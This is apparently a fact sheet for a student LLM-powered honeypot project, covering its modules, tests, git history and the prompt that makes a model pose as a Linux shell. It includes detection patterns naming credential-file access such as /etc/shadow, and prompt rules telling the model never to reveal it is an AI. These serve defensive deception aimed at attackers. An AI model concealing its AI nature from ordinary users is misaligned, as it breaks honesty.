# PROJECT_FACTS.md — Verified Codebase Fact Sheet
**Project Name:** Adaptive LLM-Powered Honeypot with Behavioural Mimicry and Threat-Intelligence–Driven Persona Switching  
**Capstone Project ID:** PW26_SVM_03 (B.Tech Capstone Phase-2, PES University, Bengaluru)  
**Guide:** Dr. Sapna V M  
**Inspection Date & Time:** 2026-10-24 19:35 IST  
**Environment Inspected:** Windows (PowerShell), Python 3.12.9, Pytest 9.0.3  

---

## A. REPO SNAPSHOT

### 1. Directory Tree (2 Levels) & One-Line Purpose Per File

```
adaptive-honeypot/
├── .agents/ (dir)                       # Antigravity agent configuration and custom skills
│   └── skills/ (dir)                   # Custom frontend design skills
├── .claude/ (dir)                       # Claude Code workspace settings and skill definitions
│   ├── settings.json                   # Claude Code environment permissions
│   ├── settings.local.json             # Machine-local Claude settings
│   └── skills/ (dir)                   # Project-level skills
├── .env.example                        # Template for API keys, port bindings, and runtime configurations
├── .env.local                          # Next.js environment override setting WebSocket URL to ws://localhost:8080/ws
├── .gitignore                          # Git ignore rules for venv, node_modules, cache, logs, and build artifacts
├── .vscode/ (dir)                      # VS Code workspace settings
│   └── settings.json                   # Editor analysis and formatting configs
├── AGENTS.md                           # Original Capstone Project architect specification and briefing document
├── CLAUDE.md                           # Duplicate copy of architect briefing document formatted for Claude Code
├── DEPLOYMENT.md                       # Ubuntu 22.04 cloud VM deployment walkthrough and iptables redirect guide
├── README.md                           # Top-level academic project README with architecture, quickstart, and metrics
├── app/ (dir)                          # Next.js 15 App Router frontend application
│   ├── globals.css                     # Tailwind CSS v4 styling rules and custom terminal color variables
│   ├── layout.tsx                      # Root HTML layout with Geist font imports and metadata
│   └── page.tsx                        # Main dashboard page composing KPI, panels, and script launcher
├── components/ (dir)                   # React UI components for the Next.js dashboard
│   ├── active-sessions.tsx             # Panel displaying live active attacker sessions with threat bars
│   ├── command-feed.tsx                # Scrolling feed displaying attacker commands color-coded by category
│   ├── dashboard-header.tsx            # Navigation header with system health status badge and connection toggle
│   ├── kpi-row.tsx                     # Top KPI metric cards (Active Sessions, Attacker Score, Switches, Defense)
│   ├── panel-shell.tsx                 # Reusable glassmorphic card container with headers and status indicators
│   ├── script-launcher.tsx             # Interactive launcher card for running demo and evaluation scripts
│   ├── system-stats.tsx                # Radar/bar visualizer comparing honeypot metrics against Cowrie baseline
│   ├── threat-badge.tsx                # Color-coded pill badge component for threat levels (low/med/high/crit)
│   └── threat-timeline.tsx             # Recharts interactive line graph tracking threat score progression
├── cowrie_integration/ (dir)           # Glue layer and installer patching the honeypot into upstream Cowrie
│   ├── cowrie_command_patch.py         # Python bridge intercepting Cowrie command execution loop
│   └── install_hook.sh                 # Shell script applying the interceptor hook into Cowrie's source tree
├── dash.png                            # Screenshot image asset of the web dashboard
├── dashboard/ (dir)                     # FastAPI backend and standalone Jinja2/HTML dashboard
│   ├── app.py                          # FastAPI application providing REST API, WebSockets, and script runner
│   ├── static/ (dir)                   # Static JavaScript and CSS for the standalone HTML dashboard
│   └── templates/ (dir)                # Jinja2 HTML templates for the standalone FastAPI dashboard (index.html)
├── dictionary/ (dir)                   # Fast-path command response dictionary (sub-50ms execution)
│   ├── __init__.py                     # Package export marker
│   ├── command_handlers.py             # 40 discrete command handlers generating terminal output from FakeFS
│   └── command_registry.py             # Registry mapping 47 command names/aliases to fast-path handler functions
├── evaluation/ (dir)                   # Evaluation reports, artifacts, and summary documentation
│   ├── README.md                       # Summary of the 3 proof points and presentation instructions
│   ├── fingerprint_report.json         # Machine-readable JSON results of 22 fingerprint probes
│   ├── fingerprint_report.txt          # Formatted text table comparing honeypot against Cowrie baseline
│   └── session_simulation.json         # Output data from simulated 25-command attacker session
├── event_logging/ (dir)                # Attacker session logging subsystem (isolated to avoid stdlib shadowing)
│   ├── __init__.py                     # Package export marker
│   ├── logs/ (dir)                     # Log storage directory containing honeypot.jsonl daily rotated logs
│   └── session_logger.py               # Structured JSON logger tracking sessions, commands, and threat deltas
├── evidence/ (dir)                     # Raw output artifacts collected during project verification
│   ├── 01_fingerprint_resistance/ (dir)# Console dumps from fingerprint resistance evaluation
│   ├── 02_consistency_tests/ (dir)     # Pytest logs for FakeFS cross-reference invariant tests
│   └── 03_simulated_session/ (dir)     # Execution transcripts from multi-stage attack scenarios
├── honeypot/ (dir)                     # Core honeypot engine modules
│   ├── __init__.py                     # Package export marker
│   ├── command_parser.py               # Tokenizer and parser handling commands, arguments, pipes, and redirects
│   ├── cowrie_hook.py                  # Drop-in dispatcher bridging Cowrie SSH sessions to Response Engine
│   ├── fakefs.py                       # Single source of truth simulating in-memory Linux filesystem and state
│   ├── ip_reputation.py                # AbuseIPDB API client assessing connecting IP maliciousness
│   ├── persona_switcher.py             # State machine managing gradual drift across persona transitions
│   ├── persona_validator.py            # Validator enforcing 8 consistency rules at persona build/load time
│   ├── response_engine.py              # Dual-path command dispatcher (fast-path dictionary vs slow-path LLM)
│   ├── session_manager.py              # In-memory session store tracking threat scores and IP reputation
│   ├── session_overlay.py              # Copy-on-write per-session ephemeral filesystem overlay
│   └── threat_scorer.py                # Command classifier, pattern detector, and threat score accumulator
├── lib/ (dir)                          # Frontend utilities and client-side simulator
│   ├── format.ts                       # String, timestamp, and byte size formatting helper functions
│   ├── simulator.ts                    # Client-side fake honeypot generator for standalone demo mode
│   ├── types.ts                        # TypeScript interface definitions for dashboard payloads and events
│   ├── use-honeypot-data.ts            # React hook managing WebSocket connection with fallback to simulator
│   └── utils.ts                        # Tailwind CSS class merging helper (cn utility)
├── next-env.d.ts                       # Next.js TypeScript ambient declaration file
├── next.config.mjs                     # Next.js framework configuration
├── node_modules/ (dir)                 # Node.js NPM package dependencies
├── package-lock.json                   # Exact npm lockfile for JavaScript dependencies
├── package.json                        # Node.js project manifest defining Next.js and React dependencies
├── personas/ (dir)                     # JSON persona definition files backing FakeFS
│   ├── dev_workstation.json            # Persona: Ubuntu 22.04 developer workstation (john.dev)
│   ├── finance_server.json             # Persona: Ubuntu 20.04 financial database server (finapp/postgres)
│   └── generic_linux.json              # Persona: Ubuntu 20.04 default web server (ubuntu/www-data)
├── pnpm-lock.yaml                      # Alternative pnpm package lockfile
├── postcss.config.mjs                  # PostCSS configuration for Tailwind CSS
├── pytest.ini                          # Pytest configuration specifying test discovery paths
├── requirements.txt                    # Python pip dependencies with minimum version pins
├── scripts/ (dir)                      # Automation, build, demo, and evaluation execution scripts
│   ├── attack_scenarios.py             # Automated runner for 4 pre-scripted attacker scenarios
│   ├── build_dev_workstation_persona.py# Generator script compiling dev_workstation.json persona
│   ├── build_finance_server_persona.py # Generator script compiling finance_server.json persona
│   ├── build_generic_linux_persona.py  # Generator script compiling generic_linux.json persona
│   ├── demo_session.py                 # Standard 10-command demo script demonstrating persona switch
│   ├── demo_session_2.py               # Stealth recon and data exfiltration demo script (14 commands)
│   ├── demo_session_3.py               # Destructive lateral movement and log wiping demo script (10 commands)
│   ├── deploy.sh                       # Automated cloud VM setup script (Cowrie + iptables + Python)
│   ├── interactive_honeypot.py         # Local terminal emulator allowing manual interactive honeypot probing
│   ├── run_evaluation.py               # Master evaluation script running 22 fingerprint probes and 25-step sim
│   ├── run_tests.sh                    # Shell wrapper running test suites
│   ├── setup.sh                        # VM provisioning script for Cowrie and dependencies
│   └── sprint3_demo.py                 # 20-command smoke test validating Response Engine fast path
├── stats.png                           # Graphic asset illustrating metrics and comparison charts
├── systemd/ (dir)                      # Systemd service unit definitions
│   └── honeypot-dashboard.service      # Systemd service configuration running dashboard backend under Uvicorn
├── tests/ (dir)                        # Automated test suites
│   ├── __init__.py                     # Package export marker
│   ├── fingerprint_tests/ (dir)        # 22-probe honeypot fingerprint detection evaluation harness
│   │   ├── __init__.py                 # Package export marker
│   │   └── fingerprint_checker.py      # Implementation of 22 fingerprint probes and Cowrie baseline scoring
│   ├── test_command_handlers.py        # Unit tests for all 40 dictionary command handlers
│   ├── test_command_parser.py          # Unit tests for command parsing, tokenization, pipes, and redirects
│   ├── test_command_registry.py        # Unit tests for command lookup, aliases, and tier validation
│   ├── test_consistency.py             # 124 cross-reference assertion tests verifying FakeFS internal coherence
│   ├── test_cowrie_integration.py      # End-to-end integration test asserting live SSH login capture (skipped)
│   ├── test_fakefs.py                  # Placeholder test file containing TODO markers
│   ├── test_fingerprint.py             # Pytest harness verifying system passes ≥ 18/22 fingerprint checks
│   ├── test_ip_reputation.py           # Unit and mock tests for AbuseIPDB API client and score calculations
│   ├── test_persona_switcher.py        # Unit tests verifying gradual change queue draining and overlay updates
│   ├── test_response_engine.py         # Tests for prompt builder, post-processing, jitter, and fallbacks
│   ├── test_session_logger.py          # Tests for JSON Lines structured logging and event schemas
│   ├── test_session_manager.py         # Tests for SessionState lifecycle, clamping, and IP reputation bonus
│   ├── test_session_overlay.py         # Tests for ephemeral file creation, directory modification, and deletion
│   ├── test_sprint3_acceptance.py      # Acceptance test executing 16 sequential commands across all 3 personas
│   ├── test_threat_integration.py      # Integration test executing 20-command attack sequences across 4 levels
│   ├── test_threat_scorer.py           # Tests for Layer 1, Layer 2, escalators, and 9 attack patterns
│   └── test_write_commands_persist.py  # Tests verifying overlay write operations persist across subsequent reads
├── tsconfig.json                       # TypeScript compiler configuration for Next.js
└── tsconfig.tsbuildinfo                # TypeScript incremental compilation cache
```

---

### 2. Exact Lines of Code (LOC) Per Python File

*Command executed:*
```bash
python -c "
import os
py_files = []
for root, dirs, files in os.walk('.'):
    if any(p in root.split(os.sep) for p in ['.venv', '.pytest_cache', '.next', 'node_modules', '__pycache__']):
        continue
    for f in files:
        if f.endswith('.py'):
            py_files.append(os.path.relpath(os.path.join(root, f), '.'))
py_files.sort()
total = 0
for pf in py_files:
    with open(pf, 'r', encoding='utf-8', errors='replace') as fh:
        c = len(fh.readlines())
    total += c
    print(f'{pf}: {c}')
print(f'TOTAL: {total} lines across {len(py_files)} files')
"
```

*Exact Output:*
```
cowrie_integration\cowrie_command_patch.py: 112
dashboard\app.py: 728
dictionary\__init__.py: 5
dictionary\command_handlers.py: 832
dictionary\command_registry.py: 139
event_logging\__init__.py: 13
event_logging\session_logger.py: 366
honeypot\__init__.py: 9
honeypot\command_parser.py: 250
honeypot\cowrie_hook.py: 359
honeypot\fakefs.py: 965
honeypot\ip_reputation.py: 165
honeypot\persona_switcher.py: 414
honeypot\persona_validator.py: 170
honeypot\response_engine.py: 546
honeypot\session_manager.py: 307
honeypot\session_overlay.py: 278
honeypot\threat_scorer.py: 649
scripts\attack_scenarios.py: 459
scripts\build_dev_workstation_persona.py: 600
scripts\build_finance_server_persona.py: 605
scripts\build_generic_linux_persona.py: 455
scripts\demo_session.py: 291
scripts\demo_session_2.py: 286
scripts\demo_session_3.py: 282
scripts\interactive_honeypot.py: 259
scripts\run_evaluation.py: 395
scripts\sprint3_demo.py: 84
tests\__init__.py: 1
tests\fingerprint_tests\__init__.py: 7
tests\fingerprint_tests\fingerprint_checker.py: 784
tests\test_command_handlers.py: 971
tests\test_command_parser.py: 379
tests\test_command_registry.py: 139
tests\test_consistency.py: 485
tests\test_cowrie_integration.py: 231
tests\test_fakefs.py: 9
tests\test_fingerprint.py: 101
tests\test_ip_reputation.py: 451
tests\test_persona_switcher.py: 574
tests\test_response_engine.py: 721
tests\test_session_logger.py: 238
tests\test_session_manager.py: 583
tests\test_session_overlay.py: 275
tests\test_sprint3_acceptance.py: 188
tests\test_threat_integration.py: 320
tests\test_threat_scorer.py: 997
tests\test_write_commands_persist.py: 140
TOTAL: 17617 lines across 48 files
```

*LOC by Subsystem Breakdown:*
- **Core Honeypot Engine (`honeypot/`):** 4,142 LOC (11 files)
- **Fast-Path Dictionary (`dictionary/`):** 976 LOC (3 files)
- **Logging Subsystem (`event_logging/`):** 379 LOC (2 files)
- **Cowrie Integration (`cowrie_integration/`):** 112 LOC (1 file)
- **Dashboard Backend (`dashboard/`):** 728 LOC (1 file)
- **Scripts & Tools (`scripts/`):** 3,716 LOC (10 files)
- **Test Suites (`tests/`):** 7,564 LOC (20 files)
- **Repository Total:** **17,617 lines across 48 Python files**

---

### 3. Total Test Count & Fresh Pytest Run Summary

*Command executed:*
```powershell
pytest
```

*Execution Details:*
- Collected: **1296 items**
- Duration: **538.51s (8 minutes 58 seconds)**
- Execution Platform: Windows (win32), Python 3.12.9, pytest-9.0.3, pluggy-1.6.0
- Plugins: anyio-4.4.0, hypothesis-6.147.0, asyncio-1.3.0

*Exact Pytest Summary Line:*
```
FAILED tests/test_fingerprint.py::TestFingerprintResistance::test_timing_simple_cmd_passes
====== 1 failed, 1294 passed, 1 skipped, 1 warning in 538.51s (0:08:58) =======
```

*Details on Non-Passing Tests:*
1. **FAILED:** `tests/test_fingerprint.py:37`: `test_timing_simple_cmd_passes` failed with `AssertionError: timing_simple_cmd failed: 1073.8ms` (assert False where False = CheckResult(..., actual='1073.8ms', expected='< 200ms').passed).
2. **SKIPPED:** `tests/test_cowrie_integration.py:8`: Skipped because no live honeypot SSH service is running locally on `127.0.0.1:2222`.
3. **WARNING:** `honeypot/cowrie_hook.py:351`: `DeprecationWarning: There is no current event loop` from `asyncio.get_event_loop()`.

---

### 4. Python Version & Dependency List

**Runtime Python Version:** `Python 3.12.9`  
**Dependencies in [`requirements.txt`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/requirements.txt):**
- Core:
  - `python-dotenv>=1.0.0`
  - `pydantic>=2.6.0`
  - `pydantic-settings>=2.2.0`
- LLM APIs (Module 3):
  - `anthropic>=0.25.0`
  - `openai>=1.14.0`
  - `google-generativeai>=0.8.0`
- HTTP / External APIs (Module 5):
  - `httpx>=0.27.0`
  - `aiohttp>=3.9.0`
- Session Store (Module 2):
  - `redis>=5.0.0`
- Dashboard (Module 6):
  - `fastapi>=0.110.0`
  - `uvicorn[standard]>=0.29.0`
  - `jinja2>=3.1.0`
  - `websockets>=12.0`
- Logging & Persistence:
  - `aiofiles>=23.2.0`
  - `python-json-logger>=2.0.7`
- Testing:
  - `pytest>=8.0.0`
  - `pytest-asyncio>=0.23.0`
  - `paramiko>=3.4.0`

**Dependencies in [`package.json`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/package.json) (Next.js Frontend):**
- `next`: `^15.1.6`
- `react`: `^19.0.0`
- `react-dom`: `^19.0.0`
- `recharts`: `^2.15.0`
- `lucide-react`: `^0.471.1`
- `clsx`: `^2.1.1`
- `tailwind-merge`: `^2.6.0`
- Dev Dependencies: `typescript` (`^5.7.3`), `@types/node` (`^22.10.7`), `@types/react` (`^19.0.7`), `@types/react-dom` (`^19.0.3`), `tailwindcss` (`^4.0.0`), `@tailwindcss/postcss` (`^4.0.0`), `postcss` (`^8.5.1`).

---

### 5. Git Snapshot: Commits, Dates, Contributors

*Command executed:*
```bash
git log --format="%h | %an | %ad | %s" --date=iso
```

*Exact Commit History (13 Commits):*
```
aa70897 | ranaxmarshgrey | 2026-08-31 12:11:25 +0530 | Install Cowrie as editable package in Cowrie virtualenv
5f66be7 | ranaxmarshgrey | 2026-08-31 12:08:06 +0530 | Set PYTHONPATH to include /opt/cowrie/src first to prevent ModuleNotFoundError
29b7956 | ranaxmarshgrey | 2026-08-31 12:03:01 +0530 | Use single-line _hp_intercept_line call in protocol.py to eliminate IndentationErrors
b183aa4 | ranaxmarshgrey | 2026-08-31 11:58:43 +0530 | Fix bash syntax error in install_hook.sh
a8dfef7 | ranaxmarshgrey | 2026-08-31 11:56:41 +0530 | Enhance lineReceived regex matching for Python type hints
1be712f | ranaxmarshgrey | 2026-08-31 11:53:19 +0530 | Fix protocol.py patching in install_hook.sh to intercept lineReceived
d69da66 | ranaxmarshgrey | 2026-08-31 11:47:47 +0530 | Connect live Cowrie SSH commands to dashboard REST endpoints
66fdb0c | ranaxmarshgrey | 2026-06-26 16:49:06 +0530 | Add interactive shell, attack scenarios, and wire Next.js to FastAPI
6eded9a | ranaxmarshgrey | 2026-06-23 11:27:29 +0530 | Merge LLM-HONEYPOT-aw repo: add Next.js frontend UI from Vercel
fa568cd | ranaxmarshgrey | 2026-06-23 11:25:18 +0530 | Add deployment config, Gemini integration, Cowrie hook, and systemd services
92aec21 | v0agent        | 2026-06-23 05:02:43 +0000 | feat: add Next.js frontend styles and layout components
a66bc4b | v0agent        | 2026-06-23 04:50:50 +0000 | Import from ranaxmarshgrey/LLM-HONEYPOT
0881e70 | ranaxmarshgrey | 2026-06-17 11:22:09 +0530 | Initial commit: Adaptive LLM-Powered Honeypot
```

*Summary:*
- Total Commits: **13**
- Date Range: **2026-06-17 11:22:09 +0530 to 2026-08-31 12:11:25 +0530**
- Contributors:
  - `ranaxmarshgrey`: 11 commits (all core python backend, evaluation, and bash scripts)
  - `v0agent`: 2 commits (Next.js frontend generated via Vercel v0)
  - *(Note: Team members listed in documentation—Kavya R Chengalath, Kiran Kumar B D, Keerthi A H, Jayanth Gowda—do not appear as distinct git commit authors in this git repository history).*

---

## B. PER-MODULE IMPLEMENTATION FACTS

### 1. Cowrie Hook & Integration (`cowrie_integration/`, `honeypot/cowrie_hook.py`)
- **Public Classes & Functions:**
  - `HoneypotCommandDispatcher` ([`cowrie_hook.py:68`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/cowrie_hook.py#L68))
  - `create_dispatcher(session_id, attacker_ip, attacker_port, persona_name, session_logger, login_user)` ([`cowrie_hook.py:313`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/cowrie_hook.py#L313))
  - `get_dispatcher(session_id, attacker_ip, attacker_port)` ([`cowrie_command_patch.py:35`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/cowrie_integration/cowrie_command_patch.py#L35))
  - `handle_command(dispatcher, raw_input)` ([`cowrie_command_patch.py:77`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/cowrie_integration/cowrie_command_patch.py#L77))
  - `close_session(dispatcher)` ([`cowrie_command_patch.py:102`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/cowrie_integration/cowrie_command_patch.py#L102))
- **Data Structures:**
  - `SimpleSession` instance holding `current_directory`, `current_user`, `command_history`, `environment`, and an in-memory `SessionOverlay` ([`cowrie_hook.py:107-112`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/cowrie_hook.py#L107-L112)).
  - Local `FakeFS`, `ResponseEngine`, `PersonaSwitcher`, and `SessionLogger` instances attached to the dispatcher.
- **Key Algorithm as Implemented:**
  - `dispatch(raw_input)` creates/retrieves an `asyncio` event loop and invokes `dispatch_async(raw_input)`.
  - Step 1: Evaluates command via `ResponseEngine.handle_command()`.
  - Step 2: If a persona transition is active (`switcher.is_transitioning()`), applies next changes to overlay.
  - Step 3: If threat decision triggers a persona switch and no transition is active, calls `switcher.initiate_switch()`.
  - Step 4: Updates `session.command_history` (appending raw command, 200 chars of output, source, cwd, category, score delta).
  - Step 5: Updates monotonic score: `threat_score = max(threat_score, decision.new_total_score)`.
  - Step 6: Logs structured JSON record to `honeypot.jsonl` via `SessionLogger.log_command()`.
  - Step 7: Fires fire-and-forget HTTP POST requests to `http://127.0.0.1:8080/api/session/*`.
- **Config Values:**
  - `HONEYPOT_DEFAULT_PERSONA`: `generic_linux`
  - `transition_steps`: 5
- **Failure Handling:**
  - In `cowrie_command_patch.py:97-99`, uncaught dispatcher exceptions are caught, logged, and return `""` (preventing Cowrie SSH crash).
  - Dashboard push notifications (`_notify_dashboard`) use `urllib.request.urlopen` with a 1-second timeout wrapped in `try...except Exception: pass` to ensure dashboard failure never impacts terminal command handling.

---

### 2. Session Manager (`honeypot/session_manager.py`)
- **Public Classes & Functions:**
  - `SessionState` (Pydantic BaseModel) ([`session_manager.py:41`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/session_manager.py#L41))
  - `SessionManager` ([`session_manager.py:84`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/session_manager.py#L84))
- **Data Structures:**
  - `self._sessions: Dict[str, SessionState]` (in-memory hash map).
  - `SessionState` fields: `session_id`, `attacker_ip`, `attacker_port`, `start_time`, `current_directory`, `current_user`, `command_history` (list), `environment` (dict), `threat_score` (int, 0–100), `threat_level` (Enum), `active_persona`, `persona_switch_count`, `persona_transition_in_progress`, `persona_transition_target`, `persona_transition_steps_remaining`, `ip_reputation` (`IPReputationResult`), `patterns_detected` (set), `categories_seen` (set), `overlay` (`SessionOverlay`), `total_commands`.
- **Key Algorithm as Implemented:**
  - `create_session()` runs `await check_ip_reputation(attacker_ip)` to fetch AbuseIPDB data; sets initial `threat_score = min(ip_rep.initial_score_bonus, 100)`.
  - `update_after_command()` validates monotonic score growth (`max(session.threat_score, decision.new_total_score)`), appends to command history, accumulates detected patterns, increments command count, and returns `ThreatDecision`.
  - `close_session()` pops session from dictionary and compiles duration, command count, patterns, and categories seen into a summary dict.
- **Config Values:**
  - In-memory store (Redis is listed in `requirements.txt` and `.env.example`, but `SessionManager` only implements in-memory dict storage; Redis backend is DOCUMENTED BUT NOT FOUND IN CODE).
- **Failure Handling:**
  - `check_ip_reputation()` swallows HTTP timeouts/errors and returns default neutral reputation (0 bonus) without crashing or blocking session creation ([`ip_reputation.py:127-142`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/ip_reputation.py#L127-L142)).
  - Clamping validator ensures `threat_score` cannot go below 0 or above 100.

---

### 3. Response Engine (`honeypot/response_engine.py`, `dictionary/`)
- **Fast-Path Command Count & Registry:**
  - Handled commands in registry: **47 names** mapped to **40 distinct handler functions** ([`dictionary/command_registry.py:62-115`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/dictionary/command_registry.py#L62-L115)):
    - *Tier 1 (20 Core):* `ls`, `pwd`, `whoami`, `id`, `uname`, `hostname`, `cat`, `echo`, `ps`, `netstat`, `ifconfig`, `ip`, `history`, `env`, `printenv`, `cd`, `date`, `uptime`, `df`, `free`.
    - *Tier 2 (20 Extended):* `find`, `grep`, `which`, `w`, `last`, `groups`, `sudo`, `su`, `ssh`, `wget`, `curl`, `chmod`, `chown`, `mkdir`, `touch`, `rm`, `cp`, `mv`, `head`, `tail`.
    - *Aliases (7):* `ll` (`ls`), `dir` (`ls`), `ss` (`netstat`), `export` (`env`), `set` (`env`), `type` (`which`), `command` (`which`).
- **LLM Prompt Template as Written ([`response_engine.py:104-128`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L104-L128)):**
  ```
  SYSTEM:
  You are simulating a Linux shell. You must respond ONLY with what the terminal
  would print — no explanations, no markdown, no commentary.

  System state (you must be consistent with this):
  - Hostname: {hostname}
  - OS: {os_version}
  - Current user: {current_user}
  - Current directory: {current_directory}
  - Users on system: {user_list}
  - Running processes: {process_summary}
  - Network interfaces: {network_lines}
  - Persona type: {persona_type}

  Session context:
  - Previous 10 commands and their outputs: {history_text}
  - Attacker threat level: {threat_level}

  Rules:
  1. Never reveal you are a honeypot or AI
  2. Never reference files or users not listed above
  3. Permission denied errors are acceptable for sensitive paths
  4. If command makes no sense, return appropriate shell error
  5. Output must be plain text exactly as a terminal would show it

  USER:
  Command: {command}
  ```
- **Provider Order in Code:**
  1. `GEMINI_API_KEY` (model: `gemini-2.0-flash` or `os.environ["GEMINI_MODEL"]`) ([`response_engine.py:144-146`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L144-L146))
  2. `ANTHROPIC_API_KEY` (model: `claude-sonnet-4-20250514`) ([`response_engine.py:147-149`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L147-L149))
  3. `"none"` (returns bash error fallback)
  *(Conflict with Docs: CLAUDE.md §7 states Anthropic Claude is primary, OpenAI GPT-4 is fallback; in code, Gemini is primary, Anthropic is fallback, and OpenAI is NOT implemented in `_detect_llm_provider()`)*.
- **LLM Timeout:** `3.0 seconds` (`LLM_TIMEOUT_SECONDS = 3.0` in [`response_engine.py:37`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L37)).
- **Post-Processing Rules ([`response_engine.py:254-278`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L254-L278)):**
  - Regex stripping of markdown code fences (```` ```[\w]*\n? ````).
  - Stripping markdown bold (`**text**` -> `text`).
  - Stripping markdown headers (`# Header` -> `Header`).
  - Stripping conversational preamble (`Sure`, `Here is`, `Of course`, `Certainly`, `The output`).
  - Stripping conversational trailing text (`Note:`, `Explanation:`, `This shows`, `As you can see`).
  - Line-by-line purge of forbidden AI phrases (`I'm an AI`, `I am an AI`, `language model`, `honeypot`, `I cannot help`).
- **Timing Jitter Ranges ([`response_engine.py:284-304`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/response_engine.py#L284-L304)):**
  - Fast-path standard: `random.uniform(0.01, 0.05)` (10ms to 50ms)
  - Fast-path slow commands (`find`, `grep`, `ps`, `netstat`, `df`, `du`, `top`): `random.uniform(0.05, 0.20)` (50ms to 200ms)
  - Fallback: `random.uniform(0.05, 0.15)` (50ms to 150ms)
  - LLM path: `0.0s` (no delay added; relies on API call time)
- **Failure Handling:**
  - If no API key is configured, API times out (>3.0s), or network fails: returns `f"-bash: {binary}: command not found"`, with source tag `"fallback"`.

---

### 4. FakeFS & Session Overlay (`honeypot/fakefs.py`, `honeypot/session_overlay.py`)
- **Persona Files:**
  - `personas/generic_linux.json` (18,696 bytes): Ubuntu 20.04.6 LTS, Kernel 5.4.0-150-generic, hostname `web-srv-03`, users: `root`, `ubuntu`, `www-data`, 7 processes, 27 filesystem entries, open ports: `[22, 80, 443]`.
  - `personas/dev_workstation.json` (25,943 bytes): Ubuntu 22.04.3 LTS, Kernel 5.15.0-88-generic, hostname `dev-workstation-07`, users: `root`, `john.dev`, 9 processes, 38 filesystem entries, open ports: `[22, 3000, 8080]`.
  - `personas/finance_server.json` (31,337 bytes): Ubuntu 20.04.6 LTS, Kernel 5.4.0-150-generic, hostname `fin-db-prod-01`, users: `root`, `postgres`, `finapp`, 11 processes, 45 filesystem entries, open ports: `[22, 5432, 8443]`.
- **Pydantic Models ([`fakefs.py:40-151`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/fakefs.py#L40-L151)):**
  - `SystemInfo`, `NetworkInterface`, `ActiveConnection`, `NetworkInfo`, `UserInfo`, `ProcessInfo`, `FileEntry`, `DiskInfo`, `MemoryInfo`, `Persona` (with `extra="forbid"`).
- **Enforcement of the 8 Consistency Rules ([`persona_validator.py:61-171`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/persona_validator.py#L61-L171)):
  1. *Rule 1 (User-Home Coherence):* User's home dir must exist and be a directory. **ACTUALLY ENFORCED.**
  2. *Rule 2 (Process-User Coherence):* Every process owner must exist in persona users. **ACTUALLY ENFORCED.**
  3. *Rule 3 (Port-Process Coherence):* Every open port must map to a running process via `PORT_SERVICES`. **ACTUALLY ENFORCED.**
  4. *Rule 4 (Hostname Coherence):* `/etc/hostname` and `/etc/hosts` must match system hostname. **ACTUALLY ENFORCED.**
  5. *Rule 5 (Timestamp Coherence):* Created/modified timestamps must be past (< now) and modified >= created. **ACTUALLY ENFORCED.**
  6. *Rule 6 (File Size Coherence):* `size_bytes` must equal exact UTF-8 byte length of `content`. **ACTUALLY ENFORCED.**
  7. *Rule 7 (Parent Directory Coherence):* Every path must have a parent directory containing it in `children`. **ACTUALLY ENFORCED.**
  8. *Rule 8 (Shadow-Passwd Coherence):* Users in `/etc/shadow` must match `/etc/passwd`. **ACTUALLY ENFORCED.**
  *(Validation occurs on load in `FakeFS._load()` via `_validate_persona()`, raising `ValueError` if any rule fails).*
- **Session Overlay:**
  - `SessionOverlay` maintains ephemeral in-memory sets: `_created_files: Dict[str, dict]`, `_created_dirs: Set[str]`, `_deleted_paths: Set[str]`.
  - Reads check overlay first. Deleted paths (via `rm`) are masked from FakeFS reads. Discarded on session termination.

---

### 5. Threat Scorer & Pattern Detector (`honeypot/threat_scorer.py`)
- **Exact-Match Entries:** **143 entries** in `EXACT_MATCH_SCORES` ([`threat_scorer.py:82-237`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L82-L237)).
- **Binary-Fallback Entries:** **45 entries** in `BINARY_SCORES` ([`threat_scorer.py:243-289`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L243-L289)).
- **Argument Escalators:** **29 entries** in `ARGUMENT_ESCALATORS` ([`threat_scorer.py:295-325`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L295-L325)).
- **The 9 Multi-Command Patterns & Actual Conditions ([`threat_scorer.py:385-445`](file:///c:/Users/Jeevitha/OneDrive/Documents/CAPSTONE/adaptive-honeypot/honeypot/threat_scorer.py#L385-L445)):**
  1. `rapid_recon_burst` (+8 bonus): At least 5 recon commands in the last 10 commands.
  2. `privilege_escalation_chain` (+12 bonus): At least 2 privilege-escalation indicators (`sudo`, `/etc/shadow`, `/etc/sudoers`, `passwd`, or `su`) in the last 5 commands.
